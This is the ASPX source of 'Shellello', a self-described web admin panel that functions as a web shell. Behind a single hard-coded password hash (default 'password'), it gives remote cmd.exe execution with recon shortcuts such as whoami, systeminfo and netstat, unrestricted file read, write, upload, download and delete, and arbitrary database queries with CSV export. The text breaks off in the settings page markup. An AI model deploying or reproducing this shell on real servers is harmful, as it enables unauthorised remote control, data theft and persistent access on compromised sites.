<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Linq" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Web.Script.Serialization" %>
<%@ Import Namespace="MySql.Data.MySqlClient" %>
<%@ Import Namespace="Npgsql" %>

<script runat="server">
// ========== Shellello - Web Admin Panel (ASPX Edition) ==========
// Version: 2.5.0
// 
// .NET Requirements:
// - Minimum: .NET Framework 4.7.2+
// - Recommended: .NET Framework 4.8
// 
// Required NuGet Packages:
// - MySql.Data (for MySQL support)
// - Npgsql (for PostgreSQL support)

// ========== CONFIGURATION ==========
protected const string AppName = "Shellello Admin";
protected const string AppVersion = "2.5.0";
private const bool DebugMode = false;

// Password hash - Change this! (default: "password")
private const string AuthHash = "432d8194182647bfe08cae6592b190a7d35be2c9d302e25e4d070d404501d7fd";

private JavaScriptSerializer _json = new JavaScriptSerializer();

// ========== PAGE LOAD ==========
protected void Page_Load(object sender, EventArgs e)
{
    // Handle API requests
    if (Request.QueryString["api"] != null)
    {
        HandleApiRequest();
        Response.End();
        return;
    }

    // Handle download
    if (Request.QueryString["download"] != null)
    {
        HandleDownload();
        Response.End();
        return;
    }

    if (!IsPostBack)
    {
        if (IsAuthenticated())
        {
            string page = Request.QueryString["page"] ?? "dashboard";
            RenderPageContent(page);
        }
    }
}

// ========== AUTHENTICATION ==========
protected bool IsAuthenticated()
{
    return Session["authenticated"] as bool? == true;
}

protected void btnLogin_Click(object sender, EventArgs e)
{
    string password = txtPassword.Text;
    string hash = ComputeSHA256(password);
    
    if (hash == AuthHash)
    {
        Session["authenticated"] = true;
        Session["login_time"] = DateTime.Now.Ticks;
        Response.Redirect("?page=dashboard");
    }
}

protected void btnLogout_Click(object sender, EventArgs e)
{
    Session["authenticated"] = false;
    Session.Remove("login_time");
    Response.Redirect(Request.RawUrl);
}

protected string GetSessionTime()
{
    if (Session["login_time"] == null) return "0m";
    
    long ticks = (long)Session["login_time"];
    TimeSpan duration = DateTime.Now - new DateTime(ticks);
    
    if (duration.TotalHours >= 1)
        return $"{duration.TotalHours:F0}h";
    return $"{duration.TotalMinutes:F0}m";
}

// ========== HELPERS ==========
private string ComputeSHA256(string input)
{
    using (SHA256 sha256 = SHA256.Create())
    {
        byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(input));
        StringBuilder builder = new StringBuilder();
        foreach (byte b in bytes)
            builder.Append(b.ToString("x2"));
        return builder.ToString();
    }
}

private void LogError(string context, Exception ex)
{
    string logPath = Path.Combine(Path.GetTempPath(), "shellello_errors.log");
    string message = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {context}: {ex.Message}";
    if (DebugMode)
        message += $"\nStack trace: {ex.StackTrace}";
    File.AppendAllText(logPath, message + "\n");
}

private string SanitizeError(Exception ex)
{
    if (DebugMode) return ex.Message;
    return "Operation failed";
}

private string GetClientIp()
{
    string xff = Request.Headers["X-Forwarded-For"];
    if (!string.IsNullOrEmpty(xff))
        return xff.Split(',')[0].Trim();
    
    return Request.UserHostAddress;
}

private string FormatBytes(long bytes)
{
    string[] sizes = { "B", "KB", "MB", "GB", "TB" };
    double len = bytes;
    int order = 0;
    while (len >= 1024 && order < sizes.Length - 1)
    {
        order++;
        len = len / 1024;
    }
    return $"{len:0.##} {sizes[order]}";
}

// ========== API HANDLERS ==========
private void HandleApiRequest()
{
    Response.ContentType = "application/json";
    
    if (!IsAuthenticated())
    {
        WriteJson(new { status = "error", message = "Not authenticated" });
        return;
    }

    string action = Request.QueryString["action"];
    object response = new { status = "error", message = "Unknown action" };

    try
    {
        switch (action)
        {
            case "list_files":
                response = HandleListFiles();
                break;
            case "read_file":
                response = HandleReadFile();
                break;
            case "save_file":
                response = HandleSaveFile();
                break;
            case "create_file":
                response = HandleCreateFile();
                break;
            case "create_folder":
                response = HandleCreateFolder();
                break;
            case "delete_item":
                response = HandleDeleteItem();
                break;
            case "rename_item":
                response = HandleRenameItem();
                break;
            case "upload_file":
                response = HandleUploadFile();
                break;
            case "exec_cmd":
                response = HandleExecCmd();
                break;
            case "db_connect":
                response = HandleDbConnect();
                break;
            case "db_disconnect":
                response = HandleDbDisconnect();
                break;
            case "db_query":
                response = HandleDbQuery();
                break;
            case "db_export_csv":
                HandleDbExportCsv();
                return;
        }
    }
    catch (Exception ex)
    {
        LogError(action, ex);
        response = new { status = "error", message = SanitizeError(ex) };
    }

    WriteJson(response);
}

private object HandleListFiles()
{
    string path = Request.QueryString["path"] ?? Directory.GetCurrentDirectory();
    var files = GetFileList(path);
    return new { status = "success", data = files, path };
}

private object HandleReadFile()
{
    string path = Request.QueryString["path"];
    if (string.IsNullOrEmpty(path))
        throw new Exception("No path specified");
    
    string content = File.ReadAllText(path);
    return new { status = "success", content };
}

private object HandleSaveFile()
{
    string path = Request.Form["path"];
    string content = Request.Form["content"];
    
    if (string.IsNullOrEmpty(path))
        throw new Exception("No path specified");
    
    File.WriteAllText(path, content);
    return new { status = "success", message = "File saved successfully" };
}

private object HandleCreateFile()
{
    string path = Request.Form["path"];
    string name = Request.Form["name"];
    string fullPath = Path.Combine(path, name);
    
    File.WriteAllText(fullPath, "");
    return new { status = "success", message = "File created" };
}

private object HandleCreateFolder()
{
    string path = Request.Form["path"];
    string name = Request.Form["name"];
    string fullPath = Path.Combine(path, name);
    
    Directory.CreateDirectory(fullPath);
    return new { status = "success", message = "Folder created" };
}

private object HandleDeleteItem()
{
    string path = Request.Form["path"];
    
    if (File.Exists(path))
        File.Delete(path);
    else if (Directory.Exists(path))
        Directory.Delete(path, true);
    
    return new { status = "success", message = "Deleted successfully" };
}

private object HandleRenameItem()
{
    string oldPath = Request.Form["old_path"];
    string newName = Request.Form["new_name"];
    string newPath = Path.Combine(Path.GetDirectoryName(oldPath), newName);
    
    if (File.Exists(oldPath))
        File.Move(oldPath, newPath);
    else if (Directory.Exists(oldPath))
        Directory.Move(oldPath, newPath);
    
    return new { status = "success", message = "Renamed successfully" };
}

private object HandleUploadFile()
{
    try
    {
        if (Request.Files.Count == 0)
            throw new Exception("No file uploaded");
        
        HttpPostedFile file = Request.Files[0];
        string path = Request.Form["path"];
        
        if (string.IsNullOrEmpty(path) || !Directory.Exists(path))
            throw new Exception("Invalid upload path");
        
        string savePath = Path.Combine(path, Path.GetFileName(file.FileName));
        file.SaveAs(savePath);
        
        return new { status = "success", message = "File uploaded" };
    }
    catch (Exception ex)
    {
        return new { status = "error", message = "Upload failed: " + ex.Message };
    }
}

private object HandleExecCmd()
{
    string cmd = Request.Form["cmd"];
    string cwd = Request.Form["cwd"];
    
    var result = ExecuteCommand(cmd, cwd);
    return new { status = "success", data = new { output = result.Item1, exit_code = result.Item2 } };
}

private object HandleDbConnect()
{
    string driver = Request.Form["driver"];
    string host = Request.Form["host"];
    string port = Request.Form["port"];
    string dbname = Request.Form["dbname"];
    string user = Request.Form["user"];
    string pass = Request.Form["pass"];
    
    // Test connection before storing in session
    try
    {
        string connStr = BuildConnectionString(driver, host, port, dbname, user, pass);
        using (var conn = CreateDbConnection(driver, connStr))
        {
            conn.Open();
            conn.Close();
        }
        
        // Connection successful, store in session
        Session["db_driver"] = driver;
        Session["db_host"] = host;
        Session["db_port"] = port;
        Session["db_name"] = dbname;
        Session["db_user"] = user;
        Session["db_pass"] = pass;
        
        return new { status = "success", message = "Connected to database" };
    }
    catch (Exception ex)
    {
        return new { status = "error", message = "Connection failed: " + ex.Message };
    }
}

private object HandleDbDisconnect()
{
    Session.Remove("db_driver");
    return new { status = "success", message = "Disconnected" };
}

private object HandleDbQuery()
{
    string query = Request.Form["query"];
    var results = ExecuteDbQuery(query);
    return new { status = "success", data = new { columns = results.Item1, rows = results.Item2 } };
}

private void HandleDbExportCsv()
{
    string query = Request.Form["query"];
    var results = ExecuteDbQuery(query);
    
    Response.ContentType = "text/csv";
    Response.AddHeader("Content-Disposition", "attachment; filename=export.csv");
    
    var writer = new StreamWriter(Response.OutputStream);
    
    // Write headers
    if (results.Item1.Count > 0)
        writer.WriteLine(string.Join(",", results.Item1));
    
    // Write rows
    foreach (var row in results.Item2)
    {
        var values = results.Item1.Select(col => row.ContainsKey(col) ? row[col]?.ToString() ?? "" : "");
        writer.WriteLine(string.Join(",", values.Select(v => $"\"{v.Replace("\"", "\"\"")}\"")));
    }
    
    writer.Flush();
}

// ========== FILE OPERATIONS ==========
private List<object> GetFileList(string dir)
{
    var files = new List<object>();
    
    if (!Directory.Exists(dir))
        return files;

    // Add parent directory
    if (dir != Path.GetPathRoot(dir))
    {
        files.Add(new
        {
            name = "..",
            type = "dir",
            size = "-",
            perms = "",
            owner = "",
            modified = ""
        });
    }

    foreach (string entry in Directory.GetFileSystemEntries(dir))
    {
        FileInfo fileInfo = new FileInfo(entry);
        bool isDir = (fileInfo.Attributes & FileAttributes.Directory) == FileAttributes.Directory;
        
        files.Add(new
        {
            name = Path.GetFileName(entry),
            type = isDir ? "dir" : "file",
            size = isDir ? "-" : FormatBytes(fileInfo.Length),
            perms = fileInfo.Attributes.ToString(),
            owner = "N/A",
            modified = fileInfo.LastWriteTime.ToString("yyyy-MM-dd HH:mm")
        });
    }

    return files.OrderBy(f => ((dynamic)f).type != "dir")
                .ThenBy(f => ((dynamic)f).name)
                .ToList();
}

// ========== COMMAND EXECUTION ==========
private Tuple<string, int> ExecuteCommand(string cmd, string cwd)
{
    var startInfo = new ProcessStartInfo
    {
        FileName = "cmd.exe",
        Arguments = $"/c {cmd}",
        WorkingDirectory = string.IsNullOrEmpty(cwd) ? Directory.GetCurrentDirectory() : cwd,
        RedirectStandardOutput = true,
        RedirectStandardError = true,
        UseShellExecute = false,
        CreateNoWindow = true
    };

    using (var process = Process.Start(startInfo))
    {
        string output = process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
        process.WaitForExit();
        return Tuple.Create(output, process.ExitCode);
    }
}

// ========== DATABASE OPERATIONS ==========
private Tuple<List<string>, List<Dictionary<string, object>>> ExecuteDbQuery(string query)
{
    string driver = Session["db_driver"] as string;
    string host = Session["db_host"] as string;
    string port = Session["db_port"] as string;
    string dbname = Session["db_name"] as string;
    string user = Session["db_user"] as string;
    string pass = Session["db_pass"] as string;

    string connectionString;
    IDbConnection connection;

    if (driver == "mysql")
    {
        connectionString = $"Server={host};Port={port};Database={dbname};Uid={user};Pwd={pass};";
        connection = new MySqlConnection(connectionString);
    }
    else if (driver == "postgres")
    {
        connectionString = $"Host={host};Port={port};Database={dbname};Username={user};Password={pass};";
        connection = new NpgsqlConnection(connectionString);
    }
    else if (driver == "sqlserver")
    {
        connectionString = $"Server={host},{port};Database={dbname};User Id={user};Password={pass};";
        connection = new SqlConnection(connectionString);
    }
    else
    {
        throw new Exception("Unsupported database driver");
    }

    using (connection)
    {
        connection.Open();
        using (var command = connection.CreateCommand())
        {
            command.CommandText = query;
            using (var reader = command.ExecuteReader())
            {
                var columns = new List<string>();
                for (int i = 0; i < reader.FieldCount; i++)
                    columns.Add(reader.GetName(i));

                var rows = new List<Dictionary<string, object>>();
                while (reader.Read())
                {
                    var row = new Dictionary<string, object>();
                    for (int i = 0; i < reader.FieldCount; i++)
                        row[columns[i]] = reader.GetValue(i);
                    rows.Add(row);
                }

                return Tuple.Create(columns, rows);
            }
        }
    }
}

// ========== DOWNLOAD HANDLER ==========
private void HandleDownload()
{
    string path = Request.QueryString["path"];
    if (!File.Exists(path))
    {
        Response.StatusCode = 404;
        return;
    }

    Response.ContentType = "application/octet-stream";
    Response.AddHeader("Content-Disposition", $"attachment; filename={Path.GetFileName(path)}");
    Response.WriteFile(path);
}

// ========== RENDERING ==========
private void WriteJson(object data)
{
    Response.Write(_json.Serialize(data));
}

private void RenderPageContent(string page)
{
    switch (page)
    {
        case "dashboard":
            RenderDashboard();
            break;
        case "files":
            RenderFileManager();
            break;
        case "database":
            RenderDatabase();
            break;
        case "terminal":
            RenderTerminal();
            break;
        case "settings":
            RenderSettings();
            break;
        default:
            phContent.Controls.Add(new Literal { Text = "<div class='card'><p>Page not found</p></div>" });
            break;
    }
}

private void RenderDashboard()
{
    var cwd = Directory.GetCurrentDirectory();
    DriveInfo drive = new DriveInfo(Path.GetPathRoot(cwd));
    
    var html = new StringBuilder();
    html.Append("<div class='card'>");
    html.Append("<div class='card-header'><span class='card-icon'>🖥️</span><h3>System Information</h3></div>");
    html.Append("<div class='info-row'><span class='info-label'>Operating System</span><span class='info-value'>" + Environment.OSVersion + "</span></div>");
    html.Append("<div class='info-row'><span class='info-label'>Machine Name</span><span class='info-value'>" + Environment.MachineName + "</span></div>");
    html.Append("<div class='info-row'><span class='info-label'>.NET Version</span><span class='info-value'>" + Environment.Version + "</span></div>");
    html.Append("<div class='info-row'><span class='info-label'>Process User</span><span class='info-value'>" + Environment.UserName + "</span></div>");
    html.Append("<div class='info-row'><span class='info-label'>Your IP</span><span class='info-value'>" + GetClientIp() + "</span></div>");
    html.Append("<div class='info-row'><span class='info-label'>Current Path</span><span class='info-value'>" + cwd + "</span></div>");
    html.Append("<div class='info-row'><span class='info-label'>Disk Free</span><span class='info-value'>" + FormatBytes(drive.AvailableFreeSpace) + " / " + FormatBytes(drive.TotalSize) + "</span></div>");
    html.Append("</div>");
    
    phContent.Controls.Add(new Literal { Text = html.ToString() });
}

private void RenderFileManager()
{
    var cwd = Directory.GetCurrentDirectory();
    
    var html = new StringBuilder();
    html.Append(@"
<div class='card toolbar'>
    <div class='path-nav'>
        <span class='path-label'>📍</span>
        <input type='text' id='currentPath' class='form-control path-input' value='" + cwd + @"' onclick='enablePathEdit()' onkeydown='if(event.key==""Enter"") navigateToPath()'>
        <button class='btn btn-secondary btn-sm' onclick='navigateToPath()'>Go</button>
        <button class='btn btn-secondary btn-sm' onclick='goUp()'>⬆️ Up</button>
        <button class='btn btn-secondary btn-sm' onclick='refreshFiles()'>🔄</button>
    </div>
    <div class='toolbar-actions'>
        <button class='btn btn-primary btn-sm' onclick='openNewFileModal()'>📄 New File</button>
        <button class='btn btn-primary btn-sm' onclick='openNewFolderModal()'>📁 New Folder</button>
        <button class='btn btn-primary btn-sm' onclick='showModal(""uploadModal"")'>⬆️ Upload</button>
    </div>
</div>

<div class='card'>
    <table class='file-table'>
        <thead>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Perms</th>
                <th>Owner</th>
                <th>Modified</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody id='fileList'>
            <tr><td colspan='6' class='text-center text-muted'>Loading...</td></tr>
        </tbody>
    </table>
</div>

<!-- Modals -->
<div class='modal-overlay' id='editorModal'>
    <div class='modal modal-lg'>
        <div class='modal-header'>
            <h3 id='editorTitle'>Edit File</h3>
            <button class='modal-close' onclick='closeModal(""editorModal"")'>&times;</button>
        </div>
        <div class='modal-body'>
            <textarea id='fileEditor' class='file-editor'></textarea>
        </div>
        <div class='modal-footer'>
            <button class='btn btn-secondary' onclick='closeModal(""editorModal"")'>Cancel</button>
            <button class='btn btn-primary' onclick='saveFile()'>💾 Save</button>
        </div>
    </div>
</div>

<div class='modal-overlay' id='newFileModal'>
    <div class='modal'>
        <div class='modal-header'>
            <h3>Create New File</h3>
            <button class='modal-close' onclick='closeModal(""newFileModal"")'>&times;</button>
        </div>
        <div class='modal-body'>
            <label>File Name:</label>
            <input type='text' id='newFileName' class='form-control' placeholder='filename.txt'>
        </div>
        <div class='modal-footer'>
            <button class='btn btn-secondary' onclick='closeModal(""newFileModal"")'>Cancel</button>
            <button class='btn btn-primary' onclick='createFile()'>Create</button>
        </div>
    </div>
</div>

<div class='modal-overlay' id='newFolderModal'>
    <div class='modal'>
        <div class='modal-header'>
            <h3>Create New Folder</h3>
            <button class='modal-close' onclick='closeModal(""newFolderModal"")'>&times;</button>
        </div>
        <div class='modal-body'>
            <label>Folder Name:</label>
            <input type='text' id='newFolderName' class='form-control' placeholder='folder-name'>
        </div>
        <div class='modal-footer'>
            <button class='btn btn-secondary' onclick='closeModal(""newFolderModal"")'>Cancel</button>
            <button class='btn btn-primary' onclick='createFolder()'>Create</button>
        </div>
    </div>
</div>

<div class='modal-overlay' id='uploadModal'>
    <div class='modal'>
        <div class='modal-header'>
            <h3>Upload File</h3>
            <button class='modal-close' onclick='closeModal(""uploadModal"")'>&times;</button>
        </div>
        <div class='modal-body'>
            <input type='file' id='fileUpload' class='form-control'>
        </div>
        <div class='modal-footer'>
            <button class='btn btn-secondary' onclick='closeModal(""uploadModal"")'>Cancel</button>
            <button class='btn btn-primary' onclick='uploadFile()'>Upload</button>
        </div>
    </div>
</div>

<div class='modal-overlay' id='deleteModal'>
    <div class='modal'>
        <div class='modal-header'>
            <h3>Confirm Delete</h3>
            <button class='modal-close' onclick='closeModal(""deleteModal"")'>&times;</button>
        </div>
        <div class='modal-body'>
            <p>Are you sure you want to delete <strong id='deleteItemName'></strong>?</p>
        </div>
        <div class='modal-footer'>
            <button class='btn btn-secondary' onclick='closeModal(""deleteModal"")'>Cancel</button>
            <button class='btn btn-danger' onclick='confirmDelete()'>Delete</button>
        </div>
    </div>
</div>

<div class='modal-overlay' id='renameModal'>
    <div class='modal'>
        <div class='modal-header'>
            <h3>Rename</h3>
            <button class='modal-close' onclick='closeModal(""renameModal"")'>&times;</button>
        </div>
        <div class='modal-body'>
            <label>New Name:</label>
            <input type='text' id='renameInput' class='form-control'>
        </div>
        <div class='modal-footer'>
            <button class='btn btn-secondary' onclick='closeModal(""renameModal"")'>Cancel</button>
            <button class='btn btn-primary' onclick='confirmRename()'>Rename</button>
        </div>
    </div>
</div>

<script>
var currentPath = " + _json.Serialize(cwd) + @";
var editingFile = null;
var deleteItemPath = null;
var renameItemPath = null;

function initFileManager() {
    loadFiles();
}

function loadFiles() {
    fetch('?api=1&action=list_files&path=' + encodeURIComponent(currentPath))
        .then(r => r.json())
        .then(data => {
            if (data.status === 'success') {
                currentPath = data.path;
                document.getElementById('currentPath').value = currentPath;
                renderFiles(data.data);
            } else {
                toast(data.message, 'error');
            }
        });
}

function renderFiles(files) {
    var tbody = document.getElementById('fileList');
    if (!files.length) {
        tbody.innerHTML = '<tr><td colspan=""6"" class=""text-center text-muted"">Empty</td></tr>';
        return;
    }
    var html = '';
    for (var i = 0; i < files.length; i++) {
        var f = files[i];
        var isDir = f.type === 'dir';
        var icon = f.name === '..' ? '⬆️' : (isDir ? '📁' : '📄');
        var cls = isDir ? 'file-name dir' : 'file-name';
        
        var fullPath = f.name === '..' ? '' : (currentPath + '\\' + f.name);
        var dbl = f.name === '..' ? 'goUp()' : (isDir ? 
            'navigateTo(\\'' + esc(fullPath) + '\\')' : 
            'editFile(\\'' + esc(fullPath) + '\\')');
        
        var acts = f.name === '..' ? '' : 
            '<button class=""action-btn"" onclick=""event.stopPropagation();showRename(\\'' + esc(fullPath) + '\\',\\'' + esc(f.name) + '\\')"">✏️</button>' +
            (isDir ? '' : '<button class=""action-btn"" onclick=""event.stopPropagation();download(\\'' + esc(fullPath) + '\\')"">⬇️</button>') +
            '<button class=""action-btn danger"" onclick=""event.stopPropagation();showDelete(\\'' + esc(fullPath) + '\\',\\'' + esc(f.name) + '\\')"">🗑️</button>';
        html += '<tr ondblclick="' + dbl + '">' +
            '<td><span class=""file-icon"">' + icon + '</span><span class=""' + cls + '"">' + esc(f.name) + '</span></td>' +
            '<td class=""text-muted"">' + f.size + '</td>' +
            '<td><code>' + f.perms + '</code></td>' +
            '<td class=""text-muted"">' + (f.owner || 'N/A') + '</td>' +
            '<td class=""text-muted"">' + f.modified + '</td>' +
            '<td class=""action-btns"">' + acts + '</td></tr>';
    }
    tbody.innerHTML = html;
}

function esc(s) {
    return s.replace(/\\\\/g,'\\\\\\\\').replace(/'/g,\"\\\\'\" );
}

function navigateTo(path) { 
    currentPath = path; 
    loadFiles(); 
}

function goUp() {
    var idx = currentPath.lastIndexOf('\\');
    if (idx > 0) {
        currentPath = currentPath.substring(0, idx);
        if (currentPath.indexOf('\\') === -1) currentPath += '\\';
    }
    loadFiles();
}

function enablePathEdit() {
    document.getElementById('currentPath').select();
}

function navigateToPath() {
    currentPath = document.getElementById('currentPath').value;
    loadFiles();
}

function refreshFiles() { loadFiles(); toast('Refreshed'); }

function editFile(path) {
    fetch('?api=1&action=read_file&path=' + encodeURIComponent(path))
        .then(r => r.json())
        .then(data => {
            if (data.status === 'success') {
                editingFile = path;
                document.getElementById('editorTitle').textContent = 'Edit: ' + path.split('\\\\').pop();
                document.getElementById('fileEditor').value = data.content;
                showModal('editorModal');
            } else { toast(data.message, 'error'); }
        });
}

function saveFile() {
    var fd = new FormData();
    fd.append('path', editingFile);
    fd.append('content', document.getElementById('fileEditor').value);
    fetch('?api=1&action=save_file', {method:'POST', body:fd})
        .then(r => r.json())
        .then(data => {
            toast(data.message, data.status);
            if (data.status === 'success') closeModal('editorModal');
        });
}

function openNewFileModal() {
    document.getElementById('newFileName').value = '';
    showModal('newFileModal');
}

function openNewFolderModal() {
    document.getElementById('newFolderName').value = '';
    showModal('newFolderModal');
}

function createFile() {
    var name = document.getElementById('newFileName').value.trim();
    if (!name) { toast('Enter file name', 'error'); return; }
    var fd = new FormData();
    fd.append('path', currentPath);
    fd.append('name', name);
    fetch('?api=1&action=create_file', {method:'POST', body:fd})
        .then(r => r.json())
        .then(data => {
            toast(data.message, data.status);
            if (data.status === 'success') { closeModal('newFileModal'); loadFiles(); }
        });
}

function createFolder() {
    var name = document.getElementById('newFolderName').value.trim();
    if (!name) { toast('Enter folder name', 'error'); return; }
    var fd = new FormData();
    fd.append('path', currentPath);
    fd.append('name', name);
    fetch('?api=1&action=create_folder', {method:'POST', body:fd})
        .then(r => r.json())
        .then(data => {
            toast(data.message, data.status);
            if (data.status === 'success') { closeModal('newFolderModal'); loadFiles(); }
        });
}

function uploadFile() {
    var fileInput = document.getElementById('fileUpload');
    if (!fileInput.files.length) { toast('Select a file', 'error'); return; }
    var fd = new FormData();
    fd.append('path', currentPath);
    fd.append('file', fileInput.files[0]);
    fetch('?api=1&action=upload_file', {method:'POST', body:fd})
        .then(r => r.json())
        .then(data => {
            toast(data.message, data.status);
            if (data.status === 'success') { closeModal('uploadModal'); loadFiles(); }
        });
}

function download(path) {
    window.location.href = '?download=1&path=' + encodeURIComponent(path);
}

function showDelete(path, name) {
    deleteItemPath = path;
    document.getElementById('deleteItemName').textContent = name;
    showModal('deleteModal');
}

function confirmDelete() {
    var fd = new FormData();
    fd.append('path', deleteItemPath);
    fetch('?api=1&action=delete_item', {method:'POST', body:fd})
        .then(r => r.json())
        .then(data => {
            toast(data.message, data.status);
            if (data.status === 'success') { closeModal('deleteModal'); loadFiles(); }
        });
}

function showRename(path, oldName) {
    renameItemPath = path;
    document.getElementById('renameInput').value = oldName;
    showModal('renameModal');
}

function confirmRename() {
    var newName = document.getElementById('renameInput').value.trim();
    if (!newName) { toast('Enter new name', 'error'); return; }
    var fd = new FormData();
    fd.append('old_path', renameItemPath);
    fd.append('new_name', newName);
    fetch('?api=1&action=rename_item', {method:'POST', body:fd})
        .then(r => r.json())
        .then(data => {
            toast(data.message, data.status);
            if (data.status === 'success') { closeModal('renameModal'); loadFiles(); }
        });
}
</script>
");
    
    phContent.Controls.Add(new Literal { Text = html.ToString() });
}

private void RenderDatabase()
{
    var html = new StringBuilder();
    html.Append(@"
<div class='card'>
    <div class='card-header'><span class='card-icon'>🗄️</span><h3>Database Client</h3></div>
    <div class='db-form'>
        <select id='dbDriver' class='form-control'>
            <option value='mysql'>MySQL</option>
            <option value='postgres'>PostgreSQL</option>
            <option value='sqlserver'>SQL Server</option>
        </select>
        <input type='text' id='dbHost' class='form-control' placeholder='Host' value='localhost'>
        <input type='text' id='dbPort' class='form-control' placeholder='Port' value='3306'>
        <input type='text' id='dbName' class='form-control' placeholder='Database'>
        <input type='text' id='dbUser' class='form-control' placeholder='Username'>
        <input type='password' id='dbPass' class='form-control' placeholder='Password'>
    </div>
    <button class='btn btn-primary' onclick='dbConnect()'>Connect</button>
    <button class='btn btn-secondary' onclick='dbDisconnect()'>Disconnect</button>
</div>

<div class='card'>
    <div class='card-header'><span class='card-icon'>⚡</span><h3>Query</h3></div>
    <div class='db-query'>
        <textarea id='dbQuery' class='form-control' placeholder='SELECT * FROM table_name LIMIT 10'></textarea>
    </div>
    <button class='btn btn-primary' onclick='dbExecute()'>Execute</button>
    <button class='btn btn-secondary' onclick='dbExportCsv()'>📥 Export CSV</button>
</div>

<div class='card'>
    <div id='dbResults'></div>
</div>

<script>
function initDatabase() {
}

function dbConnect() {
    var fd = new FormData();
    fd.append('driver', document.getElementById('dbDriver').value);
    fd.append('host', document.getElementById('dbHost').value);
    fd.append('port', document.getElementById('dbPort').value);
    fd.append('dbname', document.getElementById('dbName').value);
    fd.append('user', document.getElementById('dbUser').value);
    fd.append('pass', document.getElementById('dbPass').value);
    
    fetch('?api=1&action=db_connect', {method:'POST', body:fd})
        .then(r => r.json())
        .then(data => {
            toast(data.message, data.status);
        });
}

function dbDisconnect() {
    fetch('?api=1&action=db_disconnect', {method:'POST'})
        .then(r => r.json())
        .then(data => {
            toast(data.message, data.status);
            document.getElementById('dbResults').innerHTML = '';
        });
}

function dbExecute() {
    var query = document.getElementById('dbQuery').value.trim();
    if (!query) { toast('Enter a query', 'error'); return; }
    
    var fd = new FormData();
    fd.append('query', query);
    
    fetch('?api=1&action=db_query', {method:'POST', body:fd})
        .then(r => r.json())
        .then(data => {
            if (data.status === 'success') {
                renderDbResults(data.data);
                toast('Query executed', 'success');
            } else {
                toast(data.message, 'error');
            }
        });
}

function renderDbResults(data) {
    var html = '<div class=""db-table""><table><thead><tr>';
    data.columns.forEach(col => {
        html += '<th>' + col + '</th>';
    });
    html += '</tr></thead><tbody>';
    data.rows.forEach(row => {
        html += '<tr>';
        data.columns.forEach(col => {
            html += '<td>' + (row[col] != null ? row[col] : 'NULL') + '</td>';
        });
        html += '</tr>';
    });
    html += '</tbody></table></div>';
    html += '<p class=""text-muted"" style=""margin-top:1rem;"">' + data.rows.length + ' rows returned</p>';
    document.getElementById('dbResults').innerHTML = html;
}

function dbExportCsv() {
    var query = document.getElementById('dbQuery').value.trim();
    if (!query) { toast('Enter a query', 'error'); return; }
    
    var fd = new FormData();
    fd.append('query', query);
    
    fetch('?api=1&action=db_export_csv', {method:'POST', body:fd})
        .then(response => response.blob())
        .then(blob => {
            var url = window.URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = 'export.csv';
            a.click();
            toast('CSV exported', 'success');
        });
}
</script>
");
    
    phContent.Controls.Add(new Literal { Text = html.ToString() });
}

private void RenderTerminal()
{
    var cwd = Directory.GetCurrentDirectory();
    
    var html = new StringBuilder();
    html.Append(@"
<div class='card'>
    <div class='card-header'><span class='card-icon'>💻</span><h3>Terminal</h3></div>
    <div class='terminal-container'>
        <div class='terminal-output' id='terminalOutput'>Shellello Terminal v" + AppVersion + @"
Ready. Working directory: " + cwd + @"

</div>
        <div class='terminal-input'>
            <input type='text' id='terminalCmd' placeholder='Enter command...' onkeydown='if(event.key===""Enter"") runCmd()' autofocus>
            <button class='btn btn-primary' onclick='runCmd()'>Run</button>
            <button class='btn btn-secondary' onclick='clearTerminal()'>Clear</button>
        </div>
    </div>
</div>

<div class='card'>
    <div class='card-header'><h3>Quick Commands</h3></div>
    <button class='btn btn-sm btn-secondary' onclick='runQuickCmd(""dir"")'>dir</button>
    <button class='btn btn-sm btn-secondary' onclick='runQuickCmd(""ipconfig"")'>ipconfig</button>
    <button class='btn btn-sm btn-secondary' onclick='runQuickCmd(""systeminfo"")'>systeminfo</button>
    <button class='btn btn-sm btn-secondary' onclick='runQuickCmd(""whoami"")'>whoami</button>
    <button class='btn btn-sm btn-secondary' onclick='runQuickCmd(""hostname"")'>hostname</button>
    <button class='btn btn-sm btn-secondary' onclick='runQuickCmd(""netstat -an"")'>netstat</button>
</div>

<script>
var terminalCwd = " + _json.Serialize(cwd) + @";

function initTerminal() {
}

function runCmd() {
    var cmd = document.getElementById('terminalCmd').value.trim();
    if (!cmd) return;
    
    addToTerminal('> ' + cmd);
    document.getElementById('terminalCmd').value = '';
    
    var fd = new FormData();
    fd.append('cmd', cmd);
    fd.append('cwd', terminalCwd);
    
    fetch('?api=1&action=exec_cmd', {method:'POST', body:fd})
        .then(r => r.json())
        .then(data => {
            if (data.status === 'success') {
                addToTerminal(data.data.output);
                addToTerminal('Exit code: ' + data.data.exit_code + '\n');
                
                // Update working directory if cd command was used
                if (cmd.trim().toLowerCase().startsWith('cd ')) {
                    // Request current directory from server
                    fetch('?api=1&action=exec_cmd', {
                        method: 'POST',
                        body: (() => { var fd = new FormData(); fd.append('cmd', 'cd'); fd.append('cwd', terminalCwd); return fd; })()
                    })
                    .then(r => r.json())
                    .then(d => {
                        if (d.status === 'success') {
                            terminalCwd = d.data.output.trim();
                        }
                    });
                }
            } else {
                addToTerminal('Error: ' + data.message + '\n');
            }
        });
}

function runQuickCmd(cmd) {
    document.getElementById('terminalCmd').value = cmd;
    runCmd();
}

function addToTerminal(text) {
    var output = document.getElementById('terminalOutput');
    output.textContent += text + '\n';
    output.scrollTop = output.scrollHeight;
}

function clearTerminal() {
    document.getElementById('terminalOutput').textContent = 'Shellello Terminal v" + AppVersion + @"\nReady.\n\n';
}
</script>
");
    
    phContent.Controls.Add(new Literal { Text = html.ToString() });
}

private void RenderSettings()
{
    var html = new StringBuilder();
    html.Append(@"
<div class='card'>
    <div class='card-header'><span class='card-icon'>⚙️</span><h3>Settings</h3></div>
    <div class='info-row'>
